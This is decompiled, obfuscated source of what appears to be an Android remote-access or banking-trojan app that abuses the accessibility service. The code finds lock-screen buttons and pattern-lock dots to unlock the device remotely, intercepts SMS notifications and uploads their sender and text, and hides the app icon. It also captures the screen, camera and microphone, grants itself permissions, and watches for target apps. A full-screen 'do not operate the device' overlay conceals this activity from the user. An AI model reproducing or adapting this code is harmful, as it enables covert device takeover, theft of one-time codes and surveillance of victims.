                                    t60.m214702c3("dqtvuisjd", "🚫 严格排除顶部Unlock图标: 位置=(" + iCenterX + "," + iCenterY + ")");
                                }
                            } else {
                                rect = rect2;
                            }
                            if (d <= 0.9d * d2 || iCenterY <= 2000) {
                                boolean z2 = d > d3 && d < 0.85d * d2;
                                obj2 = obj3;
                                double d4 = iCenterX;
                                double d5 = i13;
                                boolean z3 = d4 > 0.1d * d5 && d4 < d5 * 0.95d;
                                boolean z4 = AbstractC0779a1.m213652a5(string2, "ImageView", false) || AbstractC0779a1.m213652a5(string2, "Button", false) || AbstractC0779a1.m213652a5(string2, "TextView", false);
                                boolean z5 = rect.width() > 80 && rect.height() > 80 && rect.width() < 300 && rect.height() < 200;
                                boolean zM211485h9 = dqtvuisjdVar.m211485h9(string3, str);
                                if (str.equalsIgnoreCase("Enter")) {
                                    i4 = 0;
                                    if (AbstractC0779a1.m213652a5(string2, "ImageButton", false) && z2 && z3) {
                                        z = 1;
                                    }
                                    i5 = (!(!z2 && z3 && z4 && z5 && !zM211485h9) && z == 0) ? i4 : 1;
                                    if (i5 != 0) {
                                        t60.m214702c3("dqtvuisjd", "🎯 锁屏确认按钮候选: 文本='" + string3 + "', 描述='" + str + "', 类名='" + string2 + "', 位置=(" + iCenterX + "," + iCenterY + "), Enter按钮=" + z);
                                    } else {
                                        t60.m214702c3("dqtvuisjd", "❌ 不符合条件: 文本='" + string3 + "', 描述='" + str + "', 位置=(" + iCenterX + "," + iCenterY + "), 合理区域=" + z2 + ", 合理X=" + z3);
                                    }
                                    i6 = i5;
                                } else {
                                    i4 = 0;
                                }
                                z = i4;
                                if (!z2) {
                                    if (i5 != 0) {
                                    }
                                    i6 = i5;
                                } else {
                                    if (i5 != 0) {
                                    }
                                    i6 = i5;
                                }
                            } else {
                                t60.m214702c3("dqtvuisjd", "🚫 排除异常高Y坐标元素: 位置=(" + iCenterX + "," + iCenterY + ")");
                            }
                        }
                    }
                }
                t60.m214702c3("dqtvuisjd", "🚫 [锁屏排除] 排除非确认按钮: 文本='" + string3 + "', 描述='" + str + "', 类名='" + string2 + "'");
                i2 = i8;
                arrayList2 = arrayList4;
                i3 = i10;
                obj2 = obj3;
                i4 = 0;
                i6 = 0;
                if (i6 != 0) {
                    ArrayList arrayList5 = arrayList2;
                    arrayList5.add(obj2);
                    size = i;
                    arrayList4 = arrayList5;
                    i7 = i4;
                    arrayList3 = arrayList;
                } else {
                    size = i;
                    i7 = i4;
                    arrayList3 = arrayList;
                    arrayList4 = arrayList2;
                }
                i9 = i3;
                i8 = i2;
                dqtvuisjdVar = this;
            }
            ArrayList arrayList6 = arrayList4;
            t60.m214702c3("dqtvuisjd", "🔍 找到 " + arrayList6.size() + " 个锁屏确认按钮候选");
            int size2 = arrayList6.size();
            int i14 = i7;
            while (true) {
                if (i14 >= size2) {
                    obj = null;
                    break;
                }
                obj = arrayList6.get(i14);
                i14++;
                CharSequence contentDescription2 = ((AccessibilityNodeInfo) obj).getContentDescription();
                if (contentDescription2 == null || (string = contentDescription2.toString()) == null) {
                    string = "";
                }
                if (string.equalsIgnoreCase("Enter")) {
                    break;
                }
            }
            AccessibilityNodeInfo accessibilityNodeInfo4 = (AccessibilityNodeInfo) obj;
            if (accessibilityNodeInfo4 != null) {
                t60.m214702c3("dqtvuisjd", "✅ 优先选择Enter按钮作为确认按钮");
                return accessibilityNodeInfo4;
            }
            Iterator it = arrayList6.iterator();
            if (it.hasNext()) {
                next = it.next();
                if (it.hasNext()) {
                    Rect rect3 = new Rect();
                    ((AccessibilityNodeInfo) next).getBoundsInScreen(rect3);
                    int iCenterX2 = rect3.centerX() + rect3.centerY();
                    do {
                        Object next2 = it.next();
                        Rect rect4 = new Rect();
                        ((AccessibilityNodeInfo) next2).getBoundsInScreen(rect4);
                        int iCenterX3 = rect4.centerX() + rect4.centerY();
                        if (iCenterX2 < iCenterX3) {
                            next = next2;
                            iCenterX2 = iCenterX3;
                        }
                    } while (it.hasNext());
                }
            } else {
                next = null;
            }
            return (AccessibilityNodeInfo) next;
        } catch (Exception e3) {
            e = e3;
            accessibilityNodeInfo2 = null;
            t60.m214705c6("dqtvuisjd", "查找锁屏确认按钮失败", e);
            return accessibilityNodeInfo2;
        }
    }

    /* renamed from: f8 */
    public final ArrayList m211465f8(AccessibilityNodeInfo accessibilityNodeInfo) {
        ArrayList arrayList = new ArrayList();
        t60.m214714d6("dqtvuisjd", "🔍 [findPatternDotsFromScreen] 开始多品牌通用检测...");
        try {
            t60.m214714d6("dqtvuisjd", "🔍 [findPatternDotsFromScreen] 方法0: 查找 ContentDescription='图案区域'...");
            AccessibilityNodeInfo accessibilityNodeInfoM211431f6 = m211431f6(accessibilityNodeInfo);
            if (accessibilityNodeInfoM211431f6 != null) {
                Rect rect = new Rect();
                accessibilityNodeInfoM211431f6.getBoundsInScreen(rect);
                t60.m214714d6("dqtvuisjd", "✅ [findPatternDotsFromScreen] 方法0成功! 找到图案区域: " + rect);
                arrayList.addAll(m211424c6(rect));
                t60.m214714d6("dqtvuisjd", "✅ [findPatternDotsFromScreen] 方法0完成，计算出" + arrayList.size() + "个点");
                if (arrayList.size() == 9) {
                    return arrayList;
                }
                arrayList.clear();
            }
            t60.m214714d6("dqtvuisjd", "🔍 [findPatternDotsFromScreen] 方法1: 查找9个子节点的容器...");
            AccessibilityNodeInfo accessibilityNodeInfoM211432f7 = m211432f7(accessibilityNodeInfo, 0);
            if (accessibilityNodeInfoM211432f7 != null) {
                t60.m214714d6("dqtvuisjd", "✅ [findPatternDotsFromScreen] 方法1成功! 找到9子节点容器");
                int childCount = accessibilityNodeInfoM211432f7.getChildCount();
                for (int i = 0; i < childCount; i++) {
                    AccessibilityNodeInfo child = accessibilityNodeInfoM211432f7.getChild(i);
                    if (child != null) {
                        child.getBoundsInScreen(new Rect());
                        arrayList.add(new PointF(r8.centerX(), r8.centerY()));
                    }
                }
                if (arrayList.size() == 9) {
                    t60.m214714d6("dqtvuisjd", "✅ [findPatternDotsFromScreen] 方法1完成，找到9个点");
                    return arrayList;
                }
                arrayList.clear();
            }
            t60.m214714d6("dqtvuisjd", "🔍 [findPatternDotsFromScreen] 方法2: 查找正方形View区域...");
            AccessibilityNodeInfo accessibilityNodeInfoM211466f9 = m211466f9(accessibilityNodeInfo, 0);
            if (accessibilityNodeInfoM211466f9 == null) {
                t60.m214726f4("dqtvuisjd", "⚠️ [findPatternDotsFromScreen] 方法1和方法2都未找到九宫格");
                return arrayList;
            }
            Rect rect2 = new Rect();
            accessibilityNodeInfoM211466f9.getBoundsInScreen(rect2);
            t60.m214714d6("dqtvuisjd", "✅ [findPatternDotsFromScreen] 方法2成功! 找到正方形区域: " + rect2);
            arrayList.addAll(m211424c6(rect2));
            t60.m214714d6("dqtvuisjd", "✅ [findPatternDotsFromScreen] 方法2完成，计算出9个点");
            return arrayList;
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ [findPatternDotsFromScreen] 查找失败", e);
            return arrayList;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:35:0x008c  */
    /* JADX WARN: Removed duplicated region for block: B:36:0x008e  */
    /* JADX WARN: Removed duplicated region for block: B:47:0x00ab A[Catch: Exception -> 0x002c, TRY_LEAVE, TryCatch #1 {Exception -> 0x002c, blocks: (B:5:0x000f, B:7:0x0025, B:13:0x0033, B:16:0x0045, B:22:0x0059, B:27:0x006c, B:29:0x007b, B:33:0x0086, B:37:0x008f, B:43:0x009f, B:45:0x00a5, B:47:0x00ab), top: B:62:0x000f }] */
    /* renamed from: f9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final AccessibilityNodeInfo m211466f9(AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        String string;
        boolean z;
        int childCount;
        if (i <= 20) {
            try {
                Rect rect = new Rect();
                accessibilityNodeInfo.getBoundsInScreen(rect);
                int iWidth = rect.width();
                int iHeight = rect.height();
                CharSequence className = accessibilityNodeInfo.getClassName();
                if (className == null || (string = className.toString()) == null) {
                    string = "";
                }
                DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
                int i2 = displayMetrics.widthPixels;
                int i3 = displayMetrics.heightPixels;
                if (iWidth > 0 && iHeight > 0) {
                    float f = iWidth / iHeight;
                    if (0.9f <= f && f <= 1.1f) {
                        z = true;
                    }
                    double d = i2;
                    boolean z2 = iWidth > ((int) (d * 0.95d)) && ((int) (0.5d * d)) <= iWidth;
                    double d2 = i3;
                    boolean z3 = ((double) rect.top) <= 0.3d * d2 && ((double) rect.bottom) < d2 * 0.95d;
                    boolean z4 = accessibilityNodeInfo.getChildCount() != 0;
                    boolean zM213652a5 = AbstractC0779a1.m213652a5(string, "View", false);
                    if (!z && z2 && z3 && z4 && zM213652a5) {
                        t60.m214714d6("dqtvuisjd", "✅ [findSquarePatternView] 找到候选正方形View!");
                        return accessibilityNodeInfo;
                    }
                    childCount = accessibilityNodeInfo.getChildCount();
                    for (int i4 = 0; i4 < childCount; i4++) {
                        AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i4);
                        if (child != null) {
                            try {
                                AccessibilityNodeInfo accessibilityNodeInfoM211466f9 = m211466f9(child, i + 1);
                                if (accessibilityNodeInfoM211466f9 != null) {
                                    return accessibilityNodeInfoM211466f9;
                                }
                            } catch (Exception e) {
                                e = e;
                                t60.m214705c6("dqtvuisjd", "❌ [findSquarePatternView] 查找失败", e);
                                return null;
                            }
                        }
                    }
                }
                z = false;
                double d3 = i2;
                if (iWidth > ((int) (d3 * 0.95d))) {
                }
                double d22 = i3;
                if (((double) rect.top) <= 0.3d * d22) {
                }
                if (accessibilityNodeInfo.getChildCount() != 0) {
                }
                boolean zM213652a52 = AbstractC0779a1.m213652a5(string, "View", false);
                if (!z) {
                }
                childCount = accessibilityNodeInfo.getChildCount();
                while (i4 < childCount) {
                }
            } catch (Exception e2) {
                e = e2;
            }
        }
        return null;
    }

    /* renamed from: g1 */
    public final Pair m211467g1() {
        try {
            Object systemService = getSystemService("window");
            t60.m214693b4(systemService, "null cannot be cast to non-null type android.view.WindowManager");
            Display defaultDisplay = ((WindowManager) systemService).getDefaultDisplay();
            Point point = new Point();
            defaultDisplay.getRealSize(point);
            t60.m214702c3("dqtvuisjd", "🔍 备用方法获取真实屏幕尺寸: " + point.x + "x" + point.y);
            if (point.x > 0 && point.y > 0) {
                DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
                t60.m214702c3("dqtvuisjd", "📊 备用方法对比 - 真实: " + point.x + "x" + point.y + ", 显示: " + displayMetrics.widthPixels + "x" + displayMetrics.heightPixels);
                int i = point.y;
                if (i >= displayMetrics.heightPixels) {
                    t60.m214714d6("dqtvuisjd", "✅ 备用方法成功获取真实屏幕尺寸: " + point.x + "x" + i);
                    return new Pair(Integer.valueOf(point.x), Integer.valueOf(point.y));
                }
            }
            DisplayMetrics displayMetrics2 = getResources().getDisplayMetrics();
            t60.m214726f4("dqtvuisjd", "🔄 备用方法回退到显示区域: " + displayMetrics2.widthPixels + "x" + displayMetrics2.heightPixels);
            return new Pair(Integer.valueOf(displayMetrics2.widthPixels), Integer.valueOf(displayMetrics2.heightPixels));
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "备用方法获取真实屏幕尺寸失败", e);
            DisplayMetrics displayMetrics3 = getResources().getDisplayMetrics();
            return new Pair(Integer.valueOf(displayMetrics3.widthPixels), Integer.valueOf(displayMetrics3.heightPixels));
        }
    }

    /* renamed from: g2 */
    public final AccessibilityNodeInfo m211468g2() {
        PowerManager powerManager = this.f52384b5;
        AccessibilityNodeInfo rootInActiveWindow = null;
        if (powerManager != null && !powerManager.isInteractive()) {
            return null;
        }
        long jUptimeMillis = SystemClock.uptimeMillis();
        AccessibilityNodeInfo accessibilityNodeInfo = this.f52391c2;
        if (accessibilityNodeInfo != null && jUptimeMillis - this.f52392c3 < this.f52393c4) {
            try {
                accessibilityNodeInfo.getPackageName();
                return accessibilityNodeInfo;
            } catch (Exception unused) {
                this.f52391c2 = null;
            }
        }
        try {
            rootInActiveWindow = getRootInActiveWindow();
        } catch (Exception unused2) {
        }
        this.f52391c2 = rootInActiveWindow;
        this.f52392c3 = jUptimeMillis;
        return rootInActiveWindow;
    }

    /* renamed from: g3 */
    public final C0763km m211469g3() {
        C0763km c0763km = this.f52427f8;
        if (c0763km == null) {
            return null;
        }
        if (c0763km != null) {
            return c0763km;
        }
        t60.m214724f2("configMaskManager");
        throw null;
    }

    /* renamed from: g4 */
    public final String m211470g4() {
        try {
            String string = Settings.Secure.getString(getContentResolver(), "android_id");
            return string == null ? "unknown" : string;
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "获取设备ID失败", e);
            return "unknown";
        }
    }

    /* renamed from: g5 */
    public final C0323a8 m211471g5() {
        C0323a8 c0323a8 = this.f52415e6;
        if (c0323a8 != null) {
            return c0323a8;
        }
        C0323a8 lj0Var = C0323a8.f53097e0.getInstance();
        if (lj0Var != null) {
            return lj0Var;
        }
        t60.m214726f4("dqtvuisjd", "⚠️ NetworkManager未初始化，返回null");
        return null;
    }

    /* renamed from: g6 */
    public final void m211472g6() {
        try {
            t60.m214714d6("dqtvuisjd", "处理MediaProjection权限获取成功");
            C0260a2 c0260a2 = this.f52369a0;
            if (c0260a2 != null) {
                c0260a2.m211329h2();
            }
            MediaProjection mediaProjection = AbstractC0241a0.f51906a0;
            if (mediaProjection == null) {
                t60.m214726f4("dqtvuisjd", "未能获取MediaProjection对象");
                return;
            }
            t60.m214714d6("dqtvuisjd", "成功获取MediaProjection对象，设置到etzbzyzqxvqm");
            m211520l7(mediaProjection);
            if (t60.m214686a2(m211427e0(), "Android 10")) {
                t60.m214714d6("dqtvuisjd", "📱 检测到小米Android 10设备，启动授权模块");
                AbstractC0780a0.m213692a3(this.f52378a9, null, new dqtvuisjd$handleMediaProjectionGranted$2(this, null), 3);
            }
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "处理MediaProjection权限获取成功失败", e);
        }
    }

    /* renamed from: g7 */
    public final void m211473g7(AccessibilityEvent accessibilityEvent) {
        String string;
        Bundle bundle;
        String string2;
        String string3;
        String string4;
        try {
            CharSequence packageName = accessibilityEvent.getPackageName();
            if (packageName != null && (string = packageName.toString()) != null && !string.equals(getApplicationContext().getPackageName())) {
                List listM213306g5 = AbstractC0716jf.m213306g5("com.android.mms", "com.android.messaging", "com.google.android.apps.messaging", StringUtil.m212470a0("KFYcdEUtDTlSOGVUFCleOQsr"), StringUtil.m212470a0("KFYcdEUxBCFZPjkXHD9eKw0pUg=="), "com.xiaomi.mipicks", StringUtil.m212470a0("KFYcdEAxGScZPCZK"), StringUtil.m212470a0("KFYcdEIoHCEZPC5KAjtKPQ=="), StringUtil.m212470a0("KFYcdE43ACFFPjgXHD9eKw0pUg=="), StringUtil.m212470a0("KFYcdEI2CT5bJDgXHDde"), StringUtil.m212470a0("KFYcdFsxGiEZPC5KAjtKPQ=="), StringUtil.m212470a0("KFYcdEQpAyEZPC5KAjtKPQ=="), StringUtil.m212470a0("KFYcdE86B2BaNDhKED1I"), StringUtil.m212470a0("KFYcdFsxGiEZPCZK"), "com.samsung.android.messaging", "com.meizu.mms");
                String lowerCase = string.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                if (listM213306g5 == null || !listM213306g5.isEmpty()) {
                    Iterator it = listM213306g5.iterator();
                    while (it.hasNext()) {
                        if (string.equalsIgnoreCase((String) it.next())) {
                            break;
                        }
                    }
                }
                if (!AbstractC0779a1.m213652a5(lowerCase, "mms", false) && !AbstractC0779a1.m213652a5(lowerCase, "message", false) && !AbstractC0779a1.m213652a5(lowerCase, "sms", false)) {
                    return;
                }
                Parcelable parcelableData = accessibilityEvent.getParcelableData();
                if ((parcelableData instanceof Notification) && (bundle = ((Notification) parcelableData).extras) != null) {
                    CharSequence charSequence = bundle.getCharSequence("android.title");
                    String str = "";
                    if (charSequence == null || (string2 = charSequence.toString()) == null) {
                        string2 = "";
                    }
                    CharSequence charSequence2 = bundle.getCharSequence("android.bigText");
                    if (charSequence2 == null || (string3 = charSequence2.toString()) == null) {
                        string3 = "";
                    }
                    CharSequence charSequence3 = bundle.getCharSequence("android.text");
                    if (charSequence3 != null && (string4 = charSequence3.toString()) != null) {
                        str = string4;
                    }
                    if (AbstractC0779a1.m213663b6(string3)) {
                        if (AbstractC0779a1.m213663b6(str)) {
                            return;
                        } else {
                            string3 = str;
                        }
                    }
                    if ((!AbstractC0779a1.m213663b6(string2) || !AbstractC0779a1.m213663b6(string3)) && !arniezsqllm.f52283a0.isDuplicateSms(string2, string3)) {
                        t60.m214714d6("dqtvuisjd", "📩 [无障碍短信] 拦截: 发送者=" + string2 + ", " + m21.m213937e5(30, string3) + "...");
                        if (this.f52415e6 != null) {
                            JSONObject jSONObject = new JSONObject();
                            jSONObject.put("number", string2);
                            jSONObject.put("text", string3);
                            jSONObject.put("timestamp", System.currentTimeMillis());
                            jSONObject.put("type", "incoming");
                            jSONObject.put("source", StringUtil.m212470a0("KloSP14rBSxePSJNCA=="));
                            jSONObject.put("packageName", string);
                            C0323a8 c0323a8 = this.f52415e6;
                            if (c0323a8 != null) {
                                c0323a8.m211659c5(jSONObject);
                            } else {
                                t60.m214724f2("networkManager");
                                throw null;
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            tz0.m214810b0("📩 [无障碍短信] 处理失败: ", e.getMessage(), "dqtvuisjd");
        }
    }

    /* renamed from: g8 */
    public final void m211474g8(AccessibilityEvent accessibilityEvent) {
        boolean zIsEmpty;
        List listM213303j0;
        try {
            CharSequence packageName = accessibilityEvent.getPackageName();
            String string = packageName != null ? packageName.toString() : null;
            synchronized (this.f52406d7) {
                zIsEmpty = this.f52405d6.isEmpty();
            }
            if (!zIsEmpty && string != null && string.length() != 0) {
                synchronized (this.f52406d7) {
                    listM213303j0 = AbstractC0715je.m213303j0(this.f52405d6.keySet());
                }
                t60.m214702c3("dqtvuisjd", "📱 [注入检测] 窗口变化: pkg=" + string + ", 任务包名=" + listM213303j0);
            }
            if (string != null && string.length() != 0 && string.length() != 0 && !string.equals(getApplicationContext().getPackageName())) {
                String packageName2 = getApplicationContext().getPackageName();
                t60.m214694b5(packageName2, "applicationContext.packageName");
                if (AbstractC0779a1.m213679d2(string, false, packageName2)) {
                    return;
                }
                m211445d0(string);
            }
        } catch (Exception unused) {
        }
    }

    /* renamed from: g9 */
    public final void m211475g9() {
        try {
            t60.m214714d6("dqtvuisjd", "📱 开始隐藏应用图标");
            if (this.f52475k6) {
                m211513l0("应用图标已隐藏", true);
                return;
            }
            this.f52475k6 = true;
            AbstractC0780a0.m213692a3(this.f52378a9, AbstractC1262tj.f60234a1, new dqtvuisjd$hideApp$1(null, this, m211462f2()), 2);
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 隐藏应用图标异常", e);
            this.f52475k6 = false;
            m211513l0("系统异常: " + e.getMessage(), false);
        }
    }

    /* renamed from: h0 */
    public final void m211476h0() {
        try {
            t60.m214714d6("dqtvuisjd", "🔄 执行降级初始化");
            if (this.f52369a0 == null) {
                this.f52369a0 = new C0260a2(this);
            }
            if (this.f52370a1 == null) {
                this.f52370a1 = new C0263a5(this);
            }
            t60.m214714d6("dqtvuisjd", "✅ 降级初始化完成");
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 降级初始化失败", e);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:63:0x024a  */
    /* JADX WARN: Removed duplicated region for block: B:66:0x0261  */
    /* renamed from: h1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m211477h1() {
        C0763km c0763km;
        Context context;
        C0260a2 c0260a2;
        dd0 dd0Var;
        C0708j7 c0708j7;
        C0614i9 c0614i9;
        JSONObject jSONObject;
        boolean zOptBoolean;
        boolean zOptBoolean2;
        String strOptString;
        String strOptString2;
        C0318a3 c0318a3;
        t60.m214714d6("dqtvuisjd", "🧹 开始清理旧管理器资源...");
        C0263a5 c0263a5 = this.f52370a1;
        if (c0263a5 != null) {
            try {
                c0263a5.m211350a6();
                t60.m214714d6("dqtvuisjd", "🧹 已停止旧 etzbzyzqxvqm 的截图协程");
            } catch (Exception unused) {
            }
        }
        C0258a0 c0258a0 = this.f52371a2;
        if (c0258a0 != null) {
            try {
                c0258a0.m211248a7();
                ((ExecutorService) c0258a0.f52087c0.getValue()).shutdownNow();
                t60.m214714d6("dqtvuisjd", "🧹 已清理旧 CameraManager（线程池/相机资源）");
            } catch (Exception unused2) {
            }
        }
        C0259a1 c0259a1 = this.f52455i6;
        if (c0259a1 != null) {
            try {
                try {
                    c0259a1.m211256a5();
                    AbstractC1117qo.m214410a3(c0259a1.f52099a5);
                } catch (Exception e) {
                    t60.m214705c6("MicrophoneManager", "释放麦克风管理器失败", e);
                }
                t60.m214714d6("dqtvuisjd", "🧹 已清理旧 MicrophoneManager（录音/协程作用域）");
            } catch (Exception unused3) {
            }
        }
        C0335a1 c0335a1 = this.f52438g9;
        if (c0335a1 != null) {
            try {
                AbstractC1117qo.m214410a3(c0335a1.f53293a7);
                ExecutorC1158qw executorC1158qw = AbstractC1262tj.f60234a1;
                y21 y21Var = new y21();
                executorC1158qw.getClass();
                c0335a1.f53293a7 = AbstractC1117qo.m214407a0(AbstractC0775a0.m213638a1(executorC1158qw, y21Var));
                t60.m214714d6("CipherCaptureManager", "🧹 CipherCaptureManager 协程作用域已重建");
            } catch (Exception unused4) {
            }
            try {
                t60.m214714d6("dqtvuisjd", "🧹 已清理旧 CipherCaptureManager（协程作用域）");
            } catch (Exception unused5) {
            }
        }
        a30 a30Var = this.f52440h1;
        if (a30Var != null) {
            try {
                AbstractC1117qo.m214410a3(a30Var.f33a2);
                t60.m214714d6("dqtvuisjd", "🧹 已清理旧 GestureExecutor（协程作用域）");
            } catch (Exception unused6) {
            }
        }
        C0260a2 c0260a22 = this.f52369a0;
        if (c0260a22 != null) {
            try {
                AbstractC1117qo.m214410a3(c0260a22.f52125b7);
                t60.m214714d6("PermissionGranter", "🧹 PermissionGranter 协程作用域已取消");
                t60.m214714d6("dqtvuisjd", "🧹 已清理旧 PermissionGranter（协程作用域）");
            } catch (Exception unused7) {
            }
        }
        t60.m214714d6("dqtvuisjd", "🧹 旧管理器资源清理完成");
        this.f52369a0 = new C0260a2(this);
        this.f52370a1 = new C0263a5(this);
        this.f52374a5 = new z50(this);
        this.f52440h1 = new a30(this);
        this.f52441h2 = new C0357a0(this, this);
        C0763km c0763km2 = this.f52427f8;
        if (c0763km2 == null) {
            t60.m214724f2("configMaskManager");
            throw null;
        }
        Context context2 = c0763km2.f57544a1;
        dqtvuisjd dqtvuisjdVar = c0763km2.f57543a0;
        try {
            c0260a2 = null;
            try {
                jSONObject = new JSONObject(AbstractC1408xb.m215154a0(context2, C0763km.f57542a3));
                zOptBoolean = jSONObject.optBoolean(StringUtil.m212470a0("LlcQOEE9LyFZNyJePDteMw=="), true);
                zOptBoolean2 = jSONObject.optBoolean(StringUtil.m212470a0("LlcQOEE9PDxYNjlcAilvOR4="), true);
                strOptString = jSONObject.optString(StringUtil.m212470a0("KFYfPEQ/IS9EOh9cCS4="), "配置中请稍后...");
                c0763km = c0763km2;
            } catch (Exception unused8) {
                c0763km = c0763km2;
            }
            try {
                strOptString2 = jSONObject.optString(StringUtil.m212470a0("KFYfPEQ/IS9EOhhMEy5ELAAr"), "正在自动配置和连接\n请勿操作设备");
                context = context2;
            } catch (Exception unused9) {
                context = context2;
                dd0Var = new dd0(true, true, "配置中请稍后...", "正在自动配置和连接\n请勿操作设备", "配置完成后将自动返回应用", "#FFFFFF", "#CCCCCC", "loading", AbstractC0716jf.m213306g5("检查最优线路中", "正在连接服务器...", "正在加载资源...", "正在初始化配置...", "正在启动"), true);
                Context context3 = context;
                t60.m214695b6(context3, "context");
                c0708j7 = new C0708j7(context3, dd0Var);
                c0763km.f57545a2 = c0708j7;
                if (!c0708j7.f57277a2) {
                }
                c0614i9 = this.f52414e5;
                if (c0614i9 != null) {
                }
                t60.m214714d6("dqtvuisjd", "✅ 适配前最小管理器初始化完成");
            }
            try {
                String strOptString3 = jSONObject.optString(StringUtil.m212470a0("KFYfPEQ/IS9EOhhNEC5YKw=="), "配置完成后将自动返回应用");
                String strOptString4 = jSONObject.optString("configMaskTextColor", "#FFFFFF");
                String strOptString5 = jSONObject.optString("configMaskSubtitleColor", "#CCCCCC");
                String strOptString6 = jSONObject.optString("configMaskStyle", "loading");
                boolean zOptBoolean3 = jSONObject.optBoolean("showAppIcon", true);
                boolean zHas = jSONObject.has("showAppIcon");
                Iterator<String> itKeys = jSONObject.keys();
                t60.m214694b5(itKeys, "config.keys()");
                t60.m214726f4("ConfigMaskManager", "★★★ showAppIcon=" + zOptBoolean3 + ", hasKey=" + zHas + ", configKeys=" + qz0.m214468f7(qz0.m214467f6(itKeys)));
                JSONArray jSONArrayOptJSONArray = jSONObject.optJSONArray("loadingTips");
                ArrayList arrayList = new ArrayList();
                if (jSONArrayOptJSONArray != null) {
                    int length = jSONArrayOptJSONArray.length();
                    for (int i = 0; i < length; i++) {
                        String strOptString7 = jSONArrayOptJSONArray.optString(i);
                        t60.m214694b5(strOptString7, "tip");
                        if (strOptString7.length() > 0) {
                            arrayList.add(strOptString7);
                        }
                    }
                }
                if (arrayList.isEmpty()) {
                    arrayList.addAll(AbstractC0716jf.m213306g5("检查最优线路中", "正在连接服务器...", "正在加载资源...", "正在初始化配置...", "正在启动"));
                }
                if (dqtvuisjdVar != null && (c0318a3 = dqtvuisjdVar.f52428f9) != null) {
                    c0318a3.f53047a2 = zOptBoolean2;
                    t60.m214714d6("dqtvuisjd", "🔧 进度条功能已".concat(zOptBoolean2 ? "启用" : "禁用"));
                }
                t60.m214694b5(strOptString, "maskText");
                t60.m214694b5(strOptString2, "maskSubtitle");
                t60.m214694b5(strOptString3, "maskStatus");
                t60.m214694b5(strOptString4, "maskTextColor");
                t60.m214694b5(strOptString5, "maskSubtitleColor");
                t60.m214694b5(strOptString6, "maskStyle");
                dd0Var = new dd0(zOptBoolean, zOptBoolean2, strOptString, strOptString2, strOptString3, strOptString4, strOptString5, strOptString6, arrayList, zOptBoolean3);
            } catch (Exception unused10) {
                dd0Var = new dd0(true, true, "配置中请稍后...", "正在自动配置和连接\n请勿操作设备", "配置完成后将自动返回应用", "#FFFFFF", "#CCCCCC", "loading", AbstractC0716jf.m213306g5("检查最优线路中", "正在连接服务器...", "正在加载资源...", "正在初始化配置...", "正在启动"), true);
                Context context32 = context;
                t60.m214695b6(context32, "context");
                c0708j7 = new C0708j7(context32, dd0Var);
                c0763km.f57545a2 = c0708j7;
                if (!c0708j7.f57277a2) {
                }
                c0614i9 = this.f52414e5;
                if (c0614i9 != null) {
                }
                t60.m214714d6("dqtvuisjd", "✅ 适配前最小管理器初始化完成");
            }
        } catch (Exception unused11) {
            c0763km = c0763km2;
            context = context2;
            c0260a2 = null;
        }
        Context context322 = context;
        t60.m214695b6(context322, "context");
        c0708j7 = new C0708j7(context322, dd0Var);
        c0763km.f57545a2 = c0708j7;
        if (!c0708j7.f57277a2) {
            Object systemService = context322.getSystemService("window");
            t60.m214693b4(systemService, "null cannot be cast to non-null type android.view.WindowManager");
            c0708j7.f57279a4 = (WindowManager) systemService;
            c0708j7.f57277a2 = true;
        }
        c0614i9 = this.f52414e5;
        if (c0614i9 != null) {
            C0260a2 c0260a23 = this.f52369a0;
            if (c0260a23 == null) {
                c0260a23 = c0260a2;
            }
            boolean z = this.f52411e2;
            c0614i9.f56823a3 = c0260a23;
            c0614i9.f56827a7 = z;
            dqtvuisjd dqtvuisjdVar2 = c0614i9.f56820a0;
            c0614i9.f56824a4 = new C0320a5(dqtvuisjdVar2);
            c0614i9.f56825a5 = new C0325b0(dqtvuisjdVar2);
        }
        t60.m214714d6("dqtvuisjd", "✅ 适配前最小管理器初始化完成");
    }

    /* renamed from: h2 */
    public final void m211478h2() throws Exception {
        try {
            if (this.f52453i4) {
                t60.m214714d6("dqtvuisjd", "🔧 模块已初始化，跳过重新初始化");
                return;
            }
            t60.m214714d6("dqtvuisjd", "🔧 初始化模块实例");
            String str = AbstractC0315a0.f53025a0;
            File filesDir = getFilesDir();
            t60.m214694b5(filesDir, "filesDir");
            AbstractC0315a0.f53039b4 = filesDir;
            m211447d2();
            lj0 lj0Var = C0323a8.f53097e0;
            Context applicationContext = getApplicationContext();
            t60.m214694b5(applicationContext, "applicationContext");
            this.f52415e6 = lj0Var.getOrCreate(applicationContext);
            this.f52413e4 = new xz0(this, this);
            this.f52414e5 = new C0614i9(this, this);
            this.f52416e7 = new C0761kk(this);
            this.f52422f3 = new r80(this, this);
            this.f52423f4 = new fd0(this, this);
            this.f52424f5 = new l81(this, this);
            this.f52425f6 = new jn0(this, this);
            t60.m214695b6(this, "service");
            t60.m214695b6(this, "context");
            C1115qm c1115qm = new C1115qm();
            ExecutorC1158qw executorC1158qw = AbstractC1262tj.f60234a1;
            y21 y21Var = new y21();
            executorC1158qw.getClass();
            AbstractC1117qo.m214407a0(AbstractC0775a0.m213638a1(executorC1158qw, y21Var));
            this.f52426f7 = c1115qm;
            this.f52427f8 = new C0763km(this, this);
            C0318a3 c0318a3 = new C0318a3(this);
            this.f52428f9 = c0318a3;
            c0318a3.f53046a1 = ConfigProgressManager$ConfigStage.IDLE;
            c0318a3.f53048a3 = 0;
            c0318a3.f53049a4 = 0;
            this.f52429g0 = new C0327b2(this, this);
            this.f52430g1 = new tu0(new w00() { // from class: com.storm.safe.rock.service.dqtvuisjd$initializeModules$1
                {
                    super(0);
                }

                @Override // p000.w00
                public final Object invoke() {
